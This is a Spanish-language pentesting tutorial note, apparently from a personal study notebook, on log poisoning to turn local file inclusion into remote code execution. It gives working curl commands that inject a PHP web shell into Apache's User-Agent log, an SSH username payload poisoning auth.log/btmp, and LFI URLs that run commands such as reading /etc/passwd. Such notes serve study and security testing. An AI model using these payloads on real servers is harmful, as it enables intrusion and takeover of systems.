# Log Poisoning (LFI -> RCE)

Tags: #LFI #OWASP #Explotacion #RCE

**Log Poisoning** es una técnica en la que un atacante **manipula archivos de registro (logs)** de una aplicación con el fin de ejecutar código malicioso.  
Combinado con una vulnerabilidad de **Local File Inclusion (LFI)**, puede llevar a una **Remote Code Execution (RCE)** en el servidor.

### Funcionamiento

1. El atacante explota un **LFI** para acceder a archivos de log.
2. Inyecta **código malicioso** en campos que son registrados en dichos logs.
3. Cuando el archivo de log es interpretado (ej. como PHP), el código se ejecuta.

### Ejemplos

- **SSH (auth.log / btmp)**
    - Inyectar código PHP en el campo **usuario** al autenticarse.
    - El código queda grabado en el log y se ejecuta al ser incluido vía LFI.

- **Apache (access.log)**
    - Inyectar código PHP en el campo **User-Agent** de una petición HTTP.
    - El código malicioso se registra en `access.log` y se ejecuta al ser leído por el LFI.

### Consideraciones

- El nombre de los archivos de log puede variar según el sistema:
    - Debian/Ubuntu → `auth.log`
    - Red Hat/CentOS → `btmp`
- Esto puede requerir pruebas para ubicar los logs correctos.

## HTML Apache

```bash 
# Ingresar al grupo 'adm' e ir a la siguiente ruta para ver los logs
/var/log
```

```shell
❯ cat access.log       # Ver los logs en Apache

# Ruta típica de logs de Apache en donde podemos ver los logs, incluyendo los del User Agent ('Mozilla/5.0 (Windows NT...)') 'User Agent': Es un campo del protocolo HTTP que puede utilizarse para transmitir información mas o menos detallada sobre el dispositivo de consulta que tramita la solicitud

'index.php?filename=/var/log/apache2/access.log'  
```

```bash 
# Hacer la solicitud a la pagina y mirar en los log el User-Agent y la petición que hicimos

❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"

	# H = Cabecera que queremos modificar
```

## Inyección de comandos 

```shell
# Podemos inyectar comandos si estamos en una pagina en PHP **Nota**: La funcion System debe de estar habilitada. Para saber si hay funciones deshabilitadas usar el siguiente comando:

❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php phpinfo(); ?>"   # Miras el phpinfo en la web y nos fijamos en 'disable_functions' para verificar que no este system ahi 
```

```shell
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"
```

```shell
# Controlar la ejecución del comando
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"     # Escapamos el dollar porque en bash a veces genera conflictos

Notas:
	1. index.php?filename=/var/log/apache2/access.log&cmd=whoami    # Colocar al final '&cmd=comando' para ejecutar cualquier comando
```

## SSH

```shell
# Ingresar al grupo 'adm' e ir a la siguiente ruta para ver los logs
/var/log
```

```shell
❯ cat auth.log            # Mirar los logs en SSH
❯ cat btmp
```

```shell
❯ ssh test@172.17.0.2     # Autenticar con ssh
```

```shell
❯ ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2

Notas:
	1. Se puede controlar la ejecución del comando, si ese archivo tiene capacidad de escritura
	2. En 'index.php?filename=/var/log/btmp&cmd=cat /etc/passwd' colocar al final '&cmd=whoami' para ejecutar cualquier comando
```